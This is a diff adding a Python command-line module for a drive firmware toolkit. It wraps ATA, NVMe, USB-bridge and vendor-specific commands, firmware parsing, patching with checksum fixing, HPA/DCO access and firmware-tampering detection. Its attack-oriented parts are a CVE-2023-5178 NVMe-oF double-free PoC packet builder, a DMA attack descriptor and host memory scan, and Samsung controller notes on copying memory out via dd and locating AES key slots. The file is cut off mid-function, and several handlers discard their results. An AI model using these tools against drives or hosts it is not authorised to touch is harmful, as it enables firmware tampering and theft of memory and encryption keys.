@@ -1,0 +1,1708 @@
+import argparse
+import json
+import struct
+import sys
+from pathlib import Path
+
+from hdd_firmware_toolkit.ata.commands import (
+    SAMSUNG_840_EVO_FW_HISTORY,
+    ATADevice,
+    ATAError,
+    ATASecurityCommands,
+)
+from hdd_firmware_toolkit.ata.sat import SATLayer
+from hdd_firmware_toolkit.ata.wd_vsc import WDVSCClient
+from hdd_firmware_toolkit.core.utils import (
+    _hex_dump,
+    diff_firmware,
+    err,
+    find_arm_function_tables,
+    hdr,
+    hexdump,
+    info,
+    ok,
+    scan_strings,
+    warn,
+)
+from hdd_firmware_toolkit.exploit.bridge_attack import ASM2362NVMeBridge
+from hdd_firmware_toolkit.exploit.fw_update import FirmwareUpdateExploit
+from hdd_firmware_toolkit.exploit.hotpatch import (
+    HotPatchConfig,
+    PatchTemplates,
+    benchmark_reads,
+    deploy_hot_patch,
+)
+from hdd_firmware_toolkit.exploit.service_area import ServiceArea, dump_all_overlays
+from hdd_firmware_toolkit.firmware.detection import FirmwareDetection
+from hdd_firmware_toolkit.firmware.patcher import FirmwarePatch, FirmwarePatcher
+from hdd_firmware_toolkit.firmware.samsung import SamsungFirmwareParser, samsung_decode
+from hdd_firmware_toolkit.firmware.seagate import SeagateFWLoader
+from hdd_firmware_toolkit.firmware.toshiba import ToshibaFirmwareParser
+from hdd_firmware_toolkit.firmware.wd import WDFirmwareParser
+from hdd_firmware_toolkit.hw.data_recovery import SATADataRecoveryOps
+from hdd_firmware_toolkit.hw.hpa_dco import HPADCOAccess
+from hdd_firmware_toolkit.hw.jtag import OpenOCDBridge
+from hdd_firmware_toolkit.hw.usb_bridge import USBToSATABridge
+from hdd_firmware_toolkit.nvme.admin import NVMeAdminPassthrough
+from hdd_firmware_toolkit.nvme.envme import eNVMeIntegration
+from hdd_firmware_toolkit.nvme.ofabrics import NVMeOverFabrics
+from hdd_firmware_toolkit.nvme.sandisk import SanDiskNVMeVSC
+from hdd_firmware_toolkit.nvme.timing import NVMeTimingSideChannel
+from hdd_firmware_toolkit.samsung_mex.aes import SamsungAESInfo
+from hdd_firmware_toolkit.samsung_mex.dma import SamsungDMAHelper
+from hdd_firmware_toolkit.samsung_mex.gpio import SamsungGPIO
+from hdd_firmware_toolkit.samsung_mex.memory_map import SamsungMEXMap
+from hdd_firmware_toolkit.samsung_mex.ncq import SamsungNCQParser
+from hdd_firmware_toolkit.samsung_mex.safe_uart import SamsungSafeUARTClient
+
+
+def cmd_toshiba_parse(args):
+    hdr(f"Parse Toshiba firmware: {args.file}")
+    data = Path(args.file).read_bytes()
+    parser = ToshibaFirmwareParser(data)
+    if not parser.valid:
+        err(f"Not a Toshiba image (magic={parser.magic!r})")
+        return
+
+
+def cmd_toshiba_nand(args):
+    hdr(f"Toshiba NAND config: {args.file}")
+    data = Path(args.file).read_bytes()
+    parser = ToshibaFirmwareParser(data)
+    if not parser.nand_config:
+        warn("No NAND config found")
+        return
+    for k, v in parser.nand_config.items():
+        pass
+
+
+# == SAT layer helpers ========================================================
+
+
+def cmd_sat_build_cdb(args):
+    hdr(f"SAT CDB: ATA CMD=0x{args.ata_cmd:02X} LBA=0x{args.lba:X} count={args.count}")
+    if args.cdb_size == "16":
+        SATLayer.build_ata_pass_through_16(
+            args.ata_cmd, args.lba, args.count, protocol=args.protocol
+        )
+    elif args.cdb_size == "12":
+        SATLayer.build_ata_pass_through_12(
+            args.ata_cmd, args.lba, args.count, protocol=args.protocol
+        )
+    else:
+        SATLayer.build_ata_pass_through_32(
+            args.ata_cmd, args.lba, args.count, protocol=args.protocol
+        )
+
+
+# == Firmware patcher helpers =================================================
+
+
+def cmd_patcher_apply(args):
+    hdr(f"Patch firmware: {args.file}")
+    data = Path(args.file).read_bytes()
+    patcher = FirmwarePatcher(data)
+    ok(f"Detected vendor: {patcher.vendor}")
+    for patch_file in args.patches:
+        patch = json.loads(Path(patch_file).read_text())
+        fp = FirmwarePatch(
+            offset=patch["offset"],
+            original=b"",  # filled by apply_patch
+            replacement=bytes.fromhex(patch["replacement"]),
+            description=patch.get("description", ""),
+        )
+        patcher.apply_patch(fp)
+    fixes = patcher.fix_all()
+    for f in fixes:
+        ok(f"Fix: {f}")
+    patcher.write(args.output)
+    ok(f"Patched firmware written to {args.output}")
+
+
+def cmd_patcher_fix(args):
+    hdr(f"Fix checksums: {args.file}")
+    data = Path(args.file).read_bytes()
+    patcher = FirmwarePatcher(data)
+    ok(f"Detected vendor: {patcher.vendor}")
+    fixes = patcher.fix_all()
+    if fixes:
+        for f in fixes:
+            ok(f"Fix: {f}")
+        patcher.write(args.output or f"fixed_{Path(args.file).name}")
+    else:
+        warn("No fixes applied")
+
+
+# == ATA security helpers =====================================================
+
+
+def cmd_ata_sec_status(args):
+    hdr("ATA Security Status (from IDENTIFY DEVICE)")
+    sec = ATASecurityCommands.parse_security_status(bytes(512))
+    if sec.get("frozen"):
+        ok("Drive is frozen (normal for OS-attached drives)")
+    if sec.get("locked"):
+        warn("Drive is locked -- supply password to unlock")
+
+
+# == NVMe helpers =============================================================
+
+
+def cmd_nvme_identify(args):
+    hdr("NVMe Identify Controller")
+    cmd = NVMeAdminPassthrough.identify_ctrlr()
+    info(f"Send via: nvme admin-passthrough /dev/nvme{args.device} --opcode={cmd.opcode} ...")
+
+
+def cmd_nvme_smart(args):
+    hdr("NVMe SMART Log")
+    NVMeAdminPassthrough.get_smart_log()
+    info(f"Parsed SMART fields: {list(NVMeAdminPassthrough.parse_smart_log(bytes(512)).keys())}")
+    info(f"Send via: nvme get-log /dev/nvme{args.device} --log-id=2 -l 512")
+
+
+def cmd_nvme_fw_dl(args):
+    hdr(f"NVMe Firmware Download: {args.file}")
+    fw_data = Path(args.file).read_bytes()
+    cmd = NVMeAdminPassthrough.firmware_download(args.offset or 0, fw_data)
+    info(f"Offset: {cmd.cdw11} dwords,  Size: {len(cmd.data)} bytes ({len(cmd.data) // 4} dwords)")
+    info(
+        f"Send via: nvme fw-download /dev/nvme{args.device} --fw={args.file} --offset={args.offset}"
+    )
+
+
+def cmd_nvme_fw_activate(args):
+    hdr(f"NVMe Firmware Activate: slot {args.slot}")
+    NVMeAdminPassthrough.firmware_activate(args.slot, args.action)
+    actions = {1: "replace", 2: "replace+enable", 3: "replace+enable+reset"}
+    info(f"Action: {actions.get(args.action, '=')}  Slot: {args.slot}")
+    info(
+        f"Send via: nvme fw-activate /dev/nvme{args.device} --slot={args.slot} --action={args.action}"
+    )
+    warn("Drive will reset if action=3")
+
+
+def cmd_nvme_vendor(args):
+    hdr(f"NVMe Vendor Cmd: opcode=0x{args.opcode:02X}")
+    info(f"cdw10=0x{args.cdw10:08X} cdw11=0x{args.cdw11:08X} data_len={args.data_len}")
+    cmd = NVMeAdminPassthrough.vendor_specific(
+        args.opcode, args.cdw10, args.cdw11, data_len=args.data_len
+    )
+    info(f"Send via: nvme admin-passthrough /dev/nvme{args.device} --opcode=0x{cmd.opcode:02X}")
+
+
+def cmd_nvme_live_identify(args):
+    """
+    Read and parse Identify Controller data from a live NVMe device.
+    Opens /dev/nvme{device}, sends IDENTIFY controller, and dumps key fields.
+    """
+    hdr(f"NVMe Live Identify Controller: /dev/nvme{args.device}")
+    cmd = NVMeAdminPassthrough.identify_ctrlr()
+    try:
+        data = NVMeAdminPassthrough.execute_admin_cmd(args.device, cmd)
+    except OSError as e:
+        err(f"ioctl failed: {e}")
+        if e.errno == 1:
+            info("Try: sudo hdd-firmware-toolkit nvme-live-identify 0")
+        return
+    parsed = NVMeAdminPassthrough.parse_identify_ctrlr(data)
+    for k, v in parsed.items():
+        info(f"  {k}: {v}")
+    if args.hex:
+        for line in _hex_dump(data[:256]).split("\n"):
+            info(line)
+
+
+def cmd_nvme_live_smart(args):
+    """
+    Read and parse SMART/Health log from a live NVMe device.
+    """
+    hdr(f"NVMe Live SMART Log: /dev/nvme{args.device}")
+    cmd = NVMeAdminPassthrough.get_smart_log()
+    try:
+        data = NVMeAdminPassthrough.execute_admin_cmd(args.device, cmd)
+    except OSError as e:
+        err(f"ioctl failed: {e}")
+        if e.errno == 1:
+            info("Try: sudo hdd-firmware-toolkit nvme-live-smart 0")
+        return
+    parsed = NVMeAdminPassthrough.parse_smart_log(data)
+    for k, v in parsed.items():
+        unit = "K" if k in ("data_units_read", "data_units_written") else ""
+        info(f"  {k}: {v}{unit}")
+    if args.hex:
+        for line in _hex_dump(data).split("\n"):
+            info(line)
+
+
+def cmd_nvme_live_get_log(args):
+    """
+    Read a raw log page from a live NVMe device and optionally parse it.
+    Supports standard (0x00-0x7F) and vendor-specific (0xC0-0xFF) log pages.
+    """
+    hdr(f"NVMe Live Get Log Page 0x{args.log_id:02X}: /dev/nvme{args.device}")
+    size = int(args.size, 0) if args.size else 512
+    cmd = NVMeAdminPassthrough.get_log_page(args.log_id, size=size)
+    try:
+        data = NVMeAdminPassthrough.execute_admin_cmd(args.device, cmd)
+    except OSError as e:
+        err(f"ioctl failed: {e}")
+        if e.errno == 1:
+            info(
+                f"Try: sudo hdd-firmware-toolkit nvme-live-get-log 0x{args.log_id:02X} --device 0"
+            )
+        return
+    ok(f"Read {len(data)} bytes from log 0x{args.log_id:02X}")
+    if args.log_id in (0xC0,) and len(data) >= 512:
+        parsed = SanDiskNVMeVSC.parse_c0_eol_log(data)
+        for k, v in parsed.items():
+            info(f"  {k}: {v}")
+    elif args.log_id in (0xCA,) and len(data) >= 160:
+        parsed = SanDiskNVMeVSC.parse_ca_device_info_log(data)
+        for k, v in parsed.items():
+            info(f"  {k}: {v}")
+    elif args.log_id in (0xD0,) and len(data) >= 512:
+        parsed = SanDiskNVMeVSC.parse_d0_vu_smart_log(data)
+        for k, v in parsed.items():
+            info(f"  {k}: {v}")
+    for line in _hex_dump(data).split("\n"):
+        info(line)
+
+
+def cmd_nvme_live_fw_log(args):
+    """Read and parse Firmware Slot Information log from a live NVMe device."""
+    hdr(f"NVMe Live Firmware Slots: /dev/nvme{args.device}")
+    cmd = NVMeAdminPassthrough.get_firmware_slot_log()
+    try:
+        data = NVMeAdminPassthrough.execute_admin_cmd(args.device, cmd)
+    except OSError as e:
+        err(f"ioctl failed: {e}")
+        return
+    parsed = NVMeAdminPassthrough.parse_firmware_slot_log(data)
+    info(f"Active slot: {parsed['active_slot']}")
+    info(f"Next reset slot: {parsed['next_reset_slot']}")
+    for s in parsed["slots"]:
+        info(f"  Slot {s['slot']}: {s['revision']}")
+
+
+def cmd_nvme_live_send(args):
+    """
+    Send a raw NVMe admin command to a live device and display result.
+    Specify opcode, cdw10-15, and data_len.  For write commands, provide a file.
+    """
+    hdr(f"NVMe Live Send: opcode=0x{args.opcode:02X} on /dev/nvme{args.device}")
+    payload = Path(args.file).read_bytes() if args.file else b""
+    is_write = bool(payload)
+    cmd = NVMeAdminPassthrough.vendor_specific(
+        args.opcode,
+        cdw10=args.cdw10,
+        cdw11=args.cdw11,
+        cdw12=args.cdw12,
+        cdw13=args.cdw13,
+        data_len=len(payload) if not is_write else 0,
+        data=payload,
+        is_write=is_write,
+        nsid=args.nsid,
+    )
+    try:
+        data = NVMeAdminPassthrough.execute_admin_cmd(args.device, cmd)
+    except OSError as e:
+        err(f"ioctl failed: {e}")
+        if e.errno == 1:
+            info(f"Try: sudo hdd-firmware-toolkit nvme-live-send 0x{args.opcode:02X} --device 0")
+        return
+    if is_write:
+        result = struct.unpack("<I", data)[0]
+        ok(f"Command completed, result=0x{result:08X}")
+    else:
+        ok(f"Read {len(data)} bytes")
+        for line in _hex_dump(data[: min(len(data), 512)]).split("\n"):
+            info(line)
+
+
+def cmd_sandisk_live_sniff(args):
+    """
+    Detect SanDisk/WD NVMe drive on a live device by reading Identify Controller
+    data and checking VID/DID against the known device database.
+    """
+    hdr(f"SanDisk/WD Live Detection: /dev/nvme{args.device}")
+    try:
+        id_data = NVMeAdminPassthrough.execute_admin_cmd(
+            args.device, NVMeAdminPassthrough.identify_ctrlr()
+        )
+    except OSError as e:
+        err(f"ioctl failed: {e}")
+        return
+    result = SanDiskNVMeVSC.sniff_vendor_log_pages(id_data)
+    if not result:
+        vid = struct.unpack_from("<H", id_data, 0)[0]
+        err(f"VID 0x{vid:04X} is not a known SanDisk/WD vendor ID")
+        return
+    info(f"Vendor: {result['vendor']}  Family: {result['family']}")
+    info(f"VID:DID = 0x{result['vid']:04X}:0x{result['did']:04X}")
+    for p in result["log_pages"]:
+        info(f"  Log 0x{p['log_id']:02X}: {p['name']} ({p['size']} bytes)")
+    # Try to read the first few vendor log pages
+    for lp in result["log_pages"][:3]:
+        try:
+            lcmd = SanDiskNVMeVSC.build_get_log_page(lp["log_id"], lp["size"])
+            ldata = NVMeAdminPassthrough.execute_admin_cmd(args.device, lcmd)
+            ok(f"Read log 0x{lp['log_id']:02X}: {len(ldata)} bytes")
+        except OSError:
+            warn(f"Log 0x{lp['log_id']:02X} not accessible")
+
+
+# == SanDisk/WD NVMe VSC helpers ==============================================
+
+
+def cmd_sandisk_id(args):
+    hdr("SanDisk/WD NVMe Identify")
+    info(f"VID: 0x{SanDiskNVMeVSC.VID_SANDISK:04X} (SanDisk)")
+    info(f"VID: 0x{SanDiskNVMeVSC.VID_WDC:04X}, 0x{SanDiskNVMeVSC.VID_WDC_2:04X} (WDC)")
+    info(f"SN740 device IDs: {[hex(d) for d in SanDiskNVMeVSC.DID_SN740]}")
+    info(f"SN560 device IDs: {[hex(d) for d in SanDiskNVMeVSC.DID_SN560]}")
+
+
+def cmd_sandisk_sniff_logs(args):
+    hdr("SanDisk/WD Vendor Log Page Detection")
+    data = bytes(4096)
+    struct.pack_into("<H", data, 0, SanDiskNVMeVSC.VID_SANDISK)
+    struct.pack_into("<H", data, 2, 0x5015)
+    result = SanDiskNVMeVSC.sniff_vendor_log_pages(data)
+    if not result:
+        err("Not a SanDisk/WD NVMe drive")
+        return
+    info(f"Vendor: {result['vendor']}  Family: {result['family']}")
+    info(f"VID:DID = {result['vid']}:{result['did']}")
+    for p in result["log_pages"]:
+        info(f"  Log 0x{p['log_id']:02X}: {p['name']} ({p['size']} bytes)")
+
+
+def cmd_sandisk_build_log(args):
+    hdr("SanDisk/WD Build Vendor Log Command")
+    log_id = int(args.log_id, 0)
+    size = int(args.size, 0) if args.size else 512
+    cmd = SanDiskNVMeVSC.build_get_log_page(log_id, size)
+    info(f"GET LOG PAGE 0x{log_id:02X} size={size}")
+    info(f"Send via: nvme get-log /dev/nvme{args.device} --log-id=0x{log_id:02X} -l {size}")
+    if hasattr(args, "dump") and args.dump:
+        info(f"Parsed log data: {cmd}")
+
+
+def cmd_sandisk_build_vu(args):
+    hdr("SanDisk/WD Build Vendor Admin Command")
+    opcode = int(args.opcode, 0)
+    cdw10 = int(args.cdw10, 0) if args.cdw10 else 0
+    cdw11 = int(args.cdw11, 0) if args.cdw11 else 0
+    SanDiskNVMeVSC.build_vu_admin_cmd(opcode, cdw10=cdw10, cdw11=cdw11)
+    info(f"VU CMD: opcode=0x{opcode:02X} cdw10=0x{cdw10:08X} cdw11=0x{cdw11:08X}")
+    info(f"Send via: nvme admin-passthrough /dev/nvme{args.device} --opcode=0x{opcode:02X}")
+
+
+def cmd_sandisk_build_purge(args):
+    hdr("SanDisk/WD Build Purge Command")
+    cmd = SanDiskNVMeVSC.build_purge_cmd()
+    info(f"opcode=0x{cmd.opcode:02X} cdw10=0x{cmd.cdw10:08X}")
+    info("WARNING: Purge is destructive and may take minutes")
+    info("Send via: nvme admin-passthrough /dev/nvme0 --opcode=0xDD --cdw10=0x0000000C")
+
+
+def cmd_sandisk_build_resize(args):
+    hdr("SanDisk/WD Build Drive Resize Command")
+    new_size = int(args.size, 0)
+    cmd = SanDiskNVMeVSC.build_drive_resize_cmd(new_size)
+    info(f"Drive Resize: {new_size} sectors ({new_size * 512 / 1e9:.1f} GB)")
+    info(f"opcode=0x{cmd.opcode:02X} cdw10=0x{cmd.cdw10:08X}")
+    info(f"cdw11=0x{cmd.cdw11:08X} cdw12=0x{cmd.cdw12:08X}")
+
+
+def cmd_sandisk_parse_c0(args):
+    hdr("SanDisk/WD Parse 0xC0 EOL Status Log")
+    data = Path(args.file).read_bytes()
+    parsed = SanDiskNVMeVSC.parse_c0_eol_log(data)
+    for k, v in parsed.items():
+        info(f"  {k}: {v}")
+
+
+def cmd_sandisk_parse_ca(args):
+    hdr("SanDisk/WD Parse 0xCA Device Info Log")
+    data = Path(args.file).read_bytes()
+    parsed = SanDiskNVMeVSC.parse_ca_device_info_log(data)
+    for k, v in parsed.items():
+        info(f"  {k}: {v}")
+
+
+def cmd_sandisk_parse_d0(args):
+    hdr("SanDisk/WD Parse 0xD0 VU SMART Log")
+    data = Path(args.file).read_bytes()
+    parsed = SanDiskNVMeVSC.parse_d0_vu_smart_log(data)
+    for k, v in parsed.items():
+        info(f"  {k}: {v}")
+
+
+# == USB bridge helpers =======================================================
+
+
+def cmd_usb_identify(args):
+    hdr("USB Bridge Identification")
+    if args.vid and args.pid:
+        bi = USBToSATABridge.identify_from_vid_pid(args.vid, args.pid)
+        if bi:
+            pass
+        else:
+            err(f"No bridge found for VID=0x{args.vid:04X} PID=0x{args.pid:04X}")
+    elif args.inquiry:
+        bi = USBToSATABridge.identify_from_inquiry(args.inquiry)
+
+
+def cmd_usb_list(args):
+    hdr("Known USB-to-SATA Bridge Chips")
+    for bi in USBToSATABridge.BRIDGE_DB:
+        ", ".join(bi.quirks) if bi.quirks else "--"
+
+
+# == Data recovery helpers ====================================================
+
+
+def cmd_dr_smart(args):
+    hdr(f"SMART Quick Test: {args.drive}")
+    SATADataRecoveryOps.smart_quick_test(args.drive)
+    info("Real execution requires physical drive access")
+
+
+def cmd_dr_identify(args):
+    hdr(f"Identify Device: {args.drive}")
+    parsed = SATADataRecoveryOps.identify_device(args.drive)
+    for k, v in parsed.items():
+        pass
+    info("Real execution requires physical drive access")
+
+
+def cmd_dr_native_max(args):
+    hdr(f"Read Native Max: {args.drive}")
+    SATADataRecoveryOps.read_native_max(args.drive)
+    info("Simulated -- requires physical drive access for real result")
+
+
+def cmd_dr_pattern(args):
+    hdr(f"Defective Sector Pattern: LBA=0x{args.lba:X}")
+    data = SATADataRecoveryOps.defective_sector_pattern_offset(args.lba, args.size)
+    Path(args.output).write_bytes(data)
+    ok(f"Wrote {len(data)} bytes -- {args.output}")
+
+
+# == HPA/DCO helpers ===========================================================
+
+
+def cmd_hpa_detect(args):
+    hdr("HPA Detection (from IDENTIFY DEVICE data)")
+    data = Path(args.file).read_bytes() if args.file else bytes(512)
+    result = HPADCOAccess.detect_hpa_from_identify(data)
+    active = result.get("hpa_active")
+    if active is True:
+        warn("HPA is active -- sectors hidden past current max")
+    elif active is None:
+        info("Cannot determine HPA from IDENTIFY alone; use READ NATIVE MAX command")
+
+
+def cmd_hpa_build_cmd(args):
+    hdr("Build HPA/DCO Command")
+    if args.type == "read-native":
+        HPADCOAccess.build_read_native_max_cmd(args.lba48)
+    elif args.type == "set-max":
+        HPADCOAccess.build_set_max_cmd(args.lba, args.persistent, args.lba48)
+    elif args.type == "dco-identify":
+        HPADCOAccess.build_dco_identify_cmd()
+    elif args.type == "dco-set":
+        info("DCO SET requires DCO data file (--dco-file)")
+        return
+    elif args.type == "dco-restore":
+        HPADCOAccess.build_dco_restore_cmd()
+    else:
+        err(f"Unknown command type: {args.type}")
+        return
+
+
+def cmd_hpa_parse_dco(args):
+    hdr("Parse DCO Feature Set Descriptor")
+    data = Path(args.file).read_bytes()
+    result = HPADCOAccess.parse_dco_data(data)
+    for name, f_info in result.get("features", {}).items():
+        status = "enabled" if f_info["enabled"] else "DISABLED"
+        if not f_info["enabled"]:
+            warn(f"  {name:<20} {status}")
+        else:
+            pass
+
+
+# == NVMe timing side-channel helpers =========================================
+
+
+def cmd_nvme_timing_baseline(args):
+    hdr("NVMe Timing Baseline Estimation")
+    import random
+
+    random.seed(42)
+    baseline_us = [random.gauss(50, 10) for _ in range(100)]
+    NVMeTimingSideChannel.estimate_read_latency(baseline_us)
+
+
+def cmd_nvme_timing_detect(args):
+    hdr("NVMe Timing Contention Detection (simulated)")
+    import random
+
+    random.seed(42)
+    baseline_us = [random.gauss(50, 10) for _ in range(100)]
+    contested_us = [random.gauss(300, 80) for _ in range(100)]
+    baseline = NVMeTimingSideChannel.estimate_read_latency(baseline_us)
+    sample = NVMeTimingSideChannel.estimate_read_latency(contested_us)
+    NVMeTimingSideChannel.detect_content_contention(baseline, sample)
+
+
+def cmd_nvme_timing_gc(args):
+    hdr("NVMe GC/Controller Timing Analysis (simulated)")
+    import random
+
+    random.seed(42)
+    times = [random.gauss(50, 10) for _ in range(90)]
+    times += [random.gauss(500, 100) for _ in range(10)]
+    random.shuffle(times)
+    NVMeTimingSideChannel.ctrl_timing_analysis(times)
+
+
+# == eNVMe platform helpers ==================================================
+
+
+def cmd_envme_dma(args):
+    hdr("eNVMe DMA Attack Descriptor")
+    eNVMeIntegration.build_dma_attack_cmd(int(args.host_addr, 0), args.size, args.direction)
+    info("Real execution requires eNVMe platform on RK3588")
+
+
+def cmd_envme_scan(args):
+    hdr("eNVMe Host Memory Scan (modelled)")
+    result = eNVMeIntegration.scan_host_memory(chunk_size=args.chunk, max_pages=args.pages)
+    for region in result["host_regions"]:
+        region["size"] // 1024
+    info("Simulated -- requires physical DMA-capable NVMe device")
+
+
+def cmd_envme_compat(args):
+    hdr("eNVMe Platform Compatibility Check")
+    data = Path(args.file).read_bytes() if args.file else bytes(4096)
+    eNVMeIntegration.detect_platform_compatibility(data)
+
+
+# == NVMe-oF helpers =========================================================
+
+
+def cmd_nvmeof_check_kernel(args):
+    hdr("NVMe-oF Kernel Vulnerability Check")
+    result = NVMeOverFabrics.check_vulnerable_kernel(args.kernel)
+    if result.get("vulnerable"):
+        warn("Kernel vulnerable to CVE-2023-5178 NVMe-oF TCP double-free")
+
+
+def cmd_nvmeof_build_icreq(args):
+    hdr("NVMe-oF TCP ICReq Builder")
+    NVMeOverFabrics.build_icreq(hdgst=args.hdgst, ddgst=args.ddgst, maxh2cdata=args.maxh2cdata)
+    info("Send via TCP to NVMe-oF target port (usually 4420)")
+
+
+def cmd_nvmeof_poc(args):
+    hdr("CVE-2023-5178 Double-Free PoC Packet")
+    NVMeOverFabrics.build_corrupt_icreq_poc()
+    warn("This generates a malformed ICReq that triggers kmalloc-96 double-free")
+    info("Requires Linux kernel < 6.8 with NVMe-oF TCP target enabled")
+
+
+# == Firmware detection helpers ==============================================
+
+
+def cmd_fwdetect_current(args):
+    hdr("Firmware Detection via Current Draw Analysis")
+    baseline = args.baseline if args.baseline else FirmwareDetection.CURRENT_BASELINE_MA
+    current = args.current if args.current else FirmwareDetection.CURRENT_BASELINE_MA + 50
+    result = FirmwareDetection.current_draw_anomaly(current, baseline)
+    if result["likely_modified"]:
+        warn("HIGH CONFIDENCE firmware modification detected via current draw")
+    elif result["suspicious"]:
+        warn("SUSPICIOUS current draw anomaly")
+
+
+def cmd_fwdetect_timing(args):
+    hdr("Firmware Detection via Timing Analysis")
+    baseline = args.baseline if args.baseline else FirmwareDetection.TIMING_BASELINE_US
+    import random
+
+    random.seed(42)
+    if args.modified:
+        times = [random.gauss(25000, 5000) for _ in range(50)]
+    else:
+        times = [random.gauss(5000, 500) for _ in range(50)]
+    result = FirmwareDetection.timing_anomaly(times, baseline)
+    if result["likely_modified"]:
+        warn("LIKELY MODIFIED firmware detected via timing analysis")
+
+
+def cmd_fwdetect_verify(args):
+    hdr("Firmware Checksum Verification")
+    data = Path(args.file).read_bytes()
+    vendor = args.vendor
+    results = FirmwareDetection.verify_all_checksums(data, vendor)
+    all_valid = True
+    for result in results:
+        if "error" in result:
+            all_valid = False
+        else:
+            "OK" if result["checksum_valid"] else "INVALID"
+            if not result["checksum_valid"]:
+                all_valid = False
+    if all_valid:
+        ok("All checksums valid")
+    else:
+        warn("Some checksums are invalid -- firmware may be modified")
+
+
+def cmd_fwdetect_report(args):
+    hdr("Comprehensive Firmware Integrity Report")
+    data = Path(args.file).read_bytes()
+    vendor = args.vendor
+    FirmwareDetection.integrity_report(data, vendor)
+
+
+# == Samsung helpers ==========================================================
+
+
+def cmd_samsung_memory_map(args):
+    hdr("Samsung MEX Memory Map  (TheMissingManual)")
+    M = SamsungMEXMap  # noqa: N806
+    rows = [
+        ("ATCM", f"0x{M.ATCM_BASE:08X}", "96-128 KB per core; mex1 sees SAFE ROM here"),
+        ("BTCM", f"0x{M.BTCM_BASE:08X}", "8 MB shared by all three cores"),
+        ("NCQ buffers", f"0x{M.NCQ_BASE:08X}", f"{M.NCQ_SLOTS} = 16 B (off-by-one vs spec's 32)"),
+        ("SATA status", f"0x{M.SATA_STATUS_REG:08X}", "poll for COMINIT"),
+        ("GPIO dir", f"0x{M.GPIO_DIR_REG:08X}", "bit=1 -- output"),
+        ("GPIO val", f"0x{M.GPIO_VAL_REG:08X}", "read/write"),
+        (
+            "Flash pwr",
+            f"0x{M.FLASH_PWR_REG:08X}",
+            f"0x{M.FLASH_PWR_ON:X}=on  0x{M.FLASH_PWR_OFF:X}=off",
+        ),
+        (
+            "DMA status/trigger",
+            f"0x{M.DMA_BASE:08X}",
+            f"trigger=0x{M.DMA_TRIGGER:X}; fire then sleep 1s",
+        ),
+        ("DMA SATA window", f"0x{M.DMA_SATA_WINDOW:08X}", "copy here -- exfiltrate via dd"),
+        ("AES ctrl", f"0x{M.AES_BASE:08X}", "OR 0x10000 to encrypt; XTS-256 only"),
+        ("AES key slot", f"0x{M.AES_KEY_SLOT:08X}", "64 bytes: key1||key2"),
+        ("AES IV", f"0x{M.AES_IV:08X}", "16 bytes"),
+        ("RNG", f"0x{M.RNG_BASE:08X}", "=32 random bytes at a time"),
+        ("UART TX", f"0x{M.UART_TX:08X}", f"SAFE mode {M.UART_BAUD} 8N1 3.3V"),
+        ("UART RX", f"0x{M.UART_RX:08X}", ""),
+        ("Flash CH0 (MEX2)", f"0x{M.FLASH_CH_MEX2[0]:08X}", ""),
+        ("Flash CH3 (MEX2)", f"0x{M.FLASH_CH_MEX2[3]:08X}", ""),
+        ("Flash CH4 (MEX3)", f"0x{M.FLASH_CH_MEX3[0]:08X}", ""),
+        ("Flash CH7 (MEX3)", f"0x{M.FLASH_CH_MEX3[3]:08X}", ""),
+        ("Flash dispatch", f"0x{M.FLASH_DISPATCH:08X}", "dest selector"),
+        ("Flash zone sel", f"0x{M.FLASH_ZONE_SEL:08X}", "zone + cmd (6=write, 7=read)"),
+        ("Flash trigger", f"0x{M.FLASH_TRIGGER:08X}", "write 1 to start; auto-clears"),
+        ("Enc ranges", f"0x{M.ENC_RANGES_ADDR:08X}", "ZEROED shortly after boot!"),
+        ("Enc key material", f"0x{M.ENC_KEY_MAT_ADDR:08X}", "ZEROED shortly after boot!"),
+        ("FTL loaded (MEX2)", f"0x{M.FTL_LOADED_MEX2:08X}", "bitarray: which FTL chunks in RAM"),
+        ("JTAG IDCODE", f"0x{M.JTAG_KNOWN_IDCODE:08X}", "instruction 0x0E"),
+    ]
+    for name, addr, notes in rows:
+        pass
+
+
+def cmd_samsung_fw_history(args):
+    hdr("Samsung 840 EVO Firmware Version History")
+    for ver, date, notes in SAMSUNG_840_EVO_FW_HISTORY:
+        pass
+    info("Packaging: ISO -- isolinux/btdsk.img -- samsung/DSRD/FW/<ver>/<VER>.enc")
+    info("Decrypt .enc with samsung_decode() (nibble-swap on high nibble)")
+    info("Updater EXE packed with WDOSX; unpack with WDOSXUnpacker.py (Python 2.7)")
+
+
+def _ocd_args(args):
+    return OpenOCDBridge(args.host, args.port)
+
+
+def cmd_samsung_gpio(args):
+    with _ocd_args(args) as ocd:
+        SamsungGPIO(ocd).print_status()
+
+
+def cmd_samsung_ncq(args):
+    with _ocd_args(args) as ocd:
+        SamsungNCQParser(ocd).print_slots()
+        if args.output:
+            slots = SamsungNCQParser(ocd).dump()
+            Path(args.output).write_text(
+                "\n".join(
+                    f"slot={s['slot']} cmd={s['cmd']:#04x} lba={s['lba']:#018x} raw={s['raw']}"
+                    for s in slots
+                )
+            )
+            ok(f"Saved to {args.output}")
+
+
+def cmd_samsung_aes_info(args):
+    with _ocd_args(args) as ocd:
+        SamsungAESInfo(ocd).print_aes_info()
+
+
+def cmd_samsung_dma_dump(args):
+    hdr(f"Samsung DMA Dump: 0x{int(args.addr, 0):08X}  size={args.size}")
+    with _ocd_args(args) as ocd:
+        helper = SamsungDMAHelper(ocd)
+        helper.copy_to_sata_window(int(args.addr, 0), args.size)
+        if args.sata_dev:
+            out = args.output or f"dma_dump_{int(args.addr, 0):08X}.bin"
+            sectors = (args.size + 511) // 512
+            import subprocess
+
+            subprocess.run(
+                ["dd", f"if={args.sata_dev}", f"of={out}", "bs=512", f"count={sectors}"],
+                check=True,
+            )
+            ok(f"Saved {sectors * 512} bytes -- {out}")
+
+
+def cmd_samsung_ftl_preload(args):
+    with _ocd_args(args) as ocd:
+        SamsungDMAHelper(ocd).preload_ftl_map(args.sata_dev, args.size_gb)
+
+
+def cmd_samsung_safe_shell(args):
+    with SamsungSafeUARTClient(args.port) as uart:
+        uart.interactive_shell()
+
+
+def cmd_samsung_safe_read(args):
+    addr = int(args.addr, 0)
+    with SamsungSafeUARTClient(args.port) as uart:
+        if args.size and args.size > 4:
+            data = uart.read_range(addr, args.size)
+            if args.output:
+                Path(args.output).write_bytes(data)
+                ok(f"Saved {len(data)} bytes -- {args.output}")
+        else:
+            uart.read_word(addr)
+
+
+def cmd_samsung_safe_write(args):
+    addr = int(args.addr, 0)
+    value = int(args.value, 0)
+    with SamsungSafeUARTClient(args.port) as uart:
+        uart.write_word(addr, value)
+        ok(f"Wrote 0x{value:08X} -- 0x{addr:08X}")
+        if args.verify:
+            rb = uart.read_word(addr)
+            if rb == value:
